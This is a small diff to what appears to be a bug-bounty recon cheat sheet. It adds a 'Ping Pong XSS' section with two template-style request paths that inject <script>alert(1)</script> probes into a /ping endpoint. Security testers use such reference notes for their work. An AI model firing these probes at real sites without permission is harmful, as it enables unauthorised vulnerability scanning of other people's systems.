@@ -1793,6 +1793,11 @@ dirsearch.py -l target.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp
 ```bash
 hostname:example.com
 ```
+## Ping Pong XSS
+```bash
+      - "{{BaseURL}}/ping/\"><script>alert(1)</script>"
+      - "{{BaseURL}}/ping?jd=a'\"><script>alert(1)</script>"
+```
 
 ### Find github
 
